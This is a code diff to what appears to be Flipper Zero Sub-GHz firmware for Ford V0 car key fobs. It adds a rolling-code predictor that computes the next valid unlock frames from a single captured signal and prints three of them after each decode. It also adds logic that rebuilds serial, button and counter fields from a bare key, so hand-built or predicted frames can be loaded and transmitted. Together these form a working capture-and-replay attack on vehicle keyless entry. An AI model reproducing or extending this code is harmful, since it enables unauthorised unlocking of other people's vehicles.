@@ -22,6 +22,7 @@ static const SubGhzBlockConst subghz_protocol_ford_v0_const = {
 #define FORD_V0_GAP_US          3500
 #define FORD_V0_TOTAL_BURSTS    6
 #define FORD_V0_UPLOAD_CAPACITY (((FORD_V0_TOTAL_BURSTS - 1U) * 169U) + 168U)
+#define FORD_V0_PREDICT_COUNT   3
 _Static_assert(
     FORD_V0_UPLOAD_CAPACITY <= PP_SHARED_UPLOAD_CAPACITY,
     "FORD_V0_UPLOAD_CAPACITY exceeds shared upload slab");
@@ -350,6 +351,32 @@ static void encode_ford_v0(
         (unsigned long)(*key1 & 0xFFFFFFFF));
 }
 
+#ifdef ENABLE_EMULATE_FEATURE
+// Ford V0 next-code predictor. The rolling counter is CLEARTEXT: decode_ford_v0
+// recovers (serial, btn, count) with a pure XOR-deinterleave and NO secret key,
+// so the full frame for any absolute counter is byte-computable by reusing the
+// exact checksum/encode/CRC path the encoder deserialize runs (lines above) --
+// this calls the existing helpers, it does not reimplement any crypto. Emits the
+// 80-bit frame as key1 (64b) + key2 (16b) for counter cnt_next. cnt_next is
+// masked to the 19-bit counter field so serial/button bits are never clobbered
+// and decode_ford_v0 recovers cnt_next exactly.
+static void ford_v0_predict_key(
+    uint8_t header_byte,
+    uint32_t serial,
+    uint8_t button,
+    uint32_t cnt_next,
+    uint64_t* key1,
+    uint16_t* key2) {
+    uint32_t cnt = cnt_next & 0x7FFFF;
+    uint8_t checksum = ford_v0_calculate_checksum(serial, cnt, button);
+    uint64_t k1 = 0;
+    encode_ford_v0(header_byte, serial, button, cnt, checksum, &k1);
+    uint8_t crc = ford_v0_calculate_crc_for_tx(k1, checksum);
+    *key1 = k1;
+    *key2 = ((uint16_t)checksum << 8) | crc;
+}
+#endif
+
 // =============================================================================
 // ENCODER IMPLEMENTATION
 // =============================================================================
@@ -493,7 +520,41 @@ SubGhzProtocolStatus
         uint32_t btn = UINT32_MAX;
         uint32_t cnt = UINT32_MAX;
         pp_encoder_read_fields(flipper_format, &serial, &btn, &cnt, NULL);
-        if(serial == UINT32_MAX || btn == UINT32_MAX || cnt == UINT32_MAX) break;
+
+        // A clone .sub may carry only Key (no Serial/Btn/Cnt); the decoder's own
+        // captures always write all three, but a hand-built or predicted-code
+        // frame need not. Ford V0's counter is CLEARTEXT, so recover the missing
+        // fields straight from Key instead of rejecting the frame. decode_ford_v0
+        // needs the checksum's parity to select its deinterleave branch, so try
+        // both parity classes and keep the one whose re-encode reproduces the
+        // saved Key exactly -- never a fabricated frame. Only a Key that
+        // reconstructs to neither branch (genuinely unusable) is rejected.
+        if(serial == UINT32_MAX || btn == UINT32_MAX || cnt == UINT32_MAX) {
+            uint32_t dserial = 0;
+            uint8_t dbtn = 0;
+            uint32_t dcount = 0;
+            bool derived = false;
+            for(int parity_branch = 0; parity_branch < 2 && !derived; ++parity_branch) {
+                uint16_t probe_key2 = (parity_branch == 0) ? 0x0000 : 0x0100;
+                uint32_t s = 0;
+                uint8_t bt = 0;
+                uint32_t c = 0;
+                decode_ford_v0(original_key1, probe_key2, &s, &bt, &c);
+                uint8_t cs = ford_v0_calculate_checksum(s, c, bt);
+                uint64_t re_key1 = 0;
+                encode_ford_v0(header_byte, s, bt, c, cs, &re_key1);
+                if(re_key1 == original_key1) {
+                    dserial = s;
+                    dbtn = bt;
+                    dcount = c;
+                    derived = true;
+                }
+            }
+            if(!derived) break;
+            if(serial == UINT32_MAX) serial = dserial;
+            if(btn == UINT32_MAX) btn = dbtn;
+            if(cnt == UINT32_MAX) cnt = dcount;
+        }
 
         instance->serial = serial;
         instance->button = (uint8_t)btn;
@@ -841,4 +902,32 @@ void subghz_protocol_decoder_ford_v0_get_string(void* context, FuriString* outpu
         instance->key2 & 0xFF,
         instance->button,
         button_name);
+
+#ifdef ENABLE_EMULATE_FEATURE
+    // Predicted next rolling codes. The counter is cleartext, so the frames for
+    // count+1..count+N are byte-exact (checksum/CRC recomputed) and thus
+    // load/emulate/save-able. Only emit when a valid frame decoded (crc_ok
+    // guarantees serial/cnt/btn are populated from a real capture).
+    if(crc_ok) {
+        uint8_t header_byte = (uint8_t)(instance->key1 >> 56);
+        for(uint32_t i = 1; i <= FORD_V0_PREDICT_COUNT; ++i) {
+            uint64_t next_key1 = 0;
+            uint16_t next_key2 = 0;
+            ford_v0_predict_key(
+                header_byte,
+                instance->serial,
+                instance->button,
+                instance->count + i,
+                &next_key1,
+                &next_key2);
+            furi_string_cat_printf(
+                output,
+                "\r\nNext+%lu:%08lX%08lX%04X",
+                (unsigned long)i,
+                (unsigned long)(uint32_t)(next_key1 >> 32),
+                (unsigned long)(uint32_t)(next_key1 & 0xFFFFFFFF),
+                next_key2);
+        }
+    }
+#endif
 }
